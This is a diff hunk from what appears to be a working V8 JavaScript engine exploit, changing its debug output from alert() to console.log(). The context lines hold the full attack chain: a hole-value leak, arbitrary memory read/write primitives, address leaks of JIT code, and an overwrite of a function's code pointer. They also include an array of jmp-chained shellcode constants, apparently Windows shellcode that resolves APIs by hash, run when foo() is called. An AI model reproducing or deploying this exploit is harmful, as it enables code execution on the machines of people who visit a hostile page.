@@ -442,35 +442,35 @@ function test(){
     var buf1 = new ArrayBuffer(0x200);
     var dataview1 = new DataView(buf1);
 
-    alert(the.hole);
+    console.log(the.hole);
     install_primitives();
 
     // let instance_addr = addr_of(wasmInstance);
     
-    // alert("[+]wasm instance addr : " + hex(instance_addr));
+    // console.log("[+]wasm instance addr : " + hex(instance_addr));
     // let rwx_addr = v8_read64(instance_addr-1n+0x60n);
-    // alert("[+]rwx addr : " + hex(rwx_addr));
+    // console.log("[+]rwx addr : " + hex(rwx_addr));
     let buf_addr = addr_of(buf1);
-    alert("[+]buf_addr : " + hex(buf_addr));
+    console.log("[+]buf_addr : " + hex(buf_addr));
     var foo_addr = addr_of(foo);
 
-    alert("[+]foo addr :" + hex(foo_addr));
+    console.log("[+]foo addr :" + hex(foo_addr));
     var code_addr = v8_read64(foo_addr+0x18n) & 0xffffffffn;
-    alert("[+]code addr : " + hex(code_addr));
+    console.log("[+]code addr : " + hex(code_addr));
     // %SystemBreak();
 
     var jit_addr = v8_read64(code_addr+0xcn);
-    alert("[+]jit code addr : " + hex(jit_addr));
+    console.log("[+]jit code addr : " + hex(jit_addr));
     var f_x_addr = addr_of(f_x);
-    alert("[+]f_x_addr : " + hex(f_x_addr));
+    console.log("[+]f_x_addr : " + hex(f_x_addr));
     var f_x_code_addr = v8_read64(f_x_addr+0x18n) & 0xffffffffn;
-    alert("[+]f_x_code_addr : " + hex(f_x_code_addr));
+    console.log("[+]f_x_code_addr : " + hex(f_x_code_addr));
 
     v8_write64(code_addr+0xcn,jit_addr+0x79n);
     // %DebugPrint(f_x);
     var test_sc = [0xceb90f0e48348fc,0xceb909090909090,0xceb515250415141,0xceb9090d2314856,0xceb9090d2314856,0xceb9060528b4865,0xceb909020528b48,0xceb909050728b48,0xceb904a4ab70f48,0xcebc03148c9314d,0xceb909090613cac,0xceb0dc9c141202c,0xceb52ebe2c10141,0xceb20528b485141,0xcebd001483c428b,0xceb00000088808b,0xceb906274c08548,0xceb909050d00148,0xceb90909018488b,0xceb909020408b44,0xceb9051e3d00149,0xceb909090c9ff48,0xceb909088348b41,0xcebc9314dd60148,0xceb9090acc03148,0xceb90900dc9c141,0xceb909090c10141,0xceb9090ee75e038,0xceb9008244c034c,0xceb58d375d13945,0xceb909024408b44,0xceb909090d00149,0xceb90480c8b4166,0xceb90901c408b44,0xceb909090d00149,0xceb909088048b41,0xceb905841d00148,0xceb905a595e5841,0xceb5a4159415841,0xceb524120ec8348,0xceb5a594158e0ff,0xceb909090128b48,0xceb90ffffff67e9,0xceb9090d231485d,0xceb909090c2ff48,0xceb9090714d8d48,0xceb909070c18348,0xceb909020c18348,0xceb876f8b31ba41,0xceb90909090d5ff,0xceb9056a2b5f0bb,0xceb9dbd95a6ba41,0xceb28c48348d5ff,0xceb9090047c063c,0xceb900275e0fb80,0xceb906f721347bb,0xcebda894159006a,0xceb906c618bd5ff,0xceb909090902e8b,0xceb909090906678];
-    alert("target : " + hex(jit_addr+0x79n));
-    alert(hex(ftoi(1.97128800932264e-246)));
+    console.log("target : " + hex(jit_addr+0x79n));
+    console.log(hex(ftoi(1.97128800932264e-246)));
     // %SystemBreak();
     foo();
 }
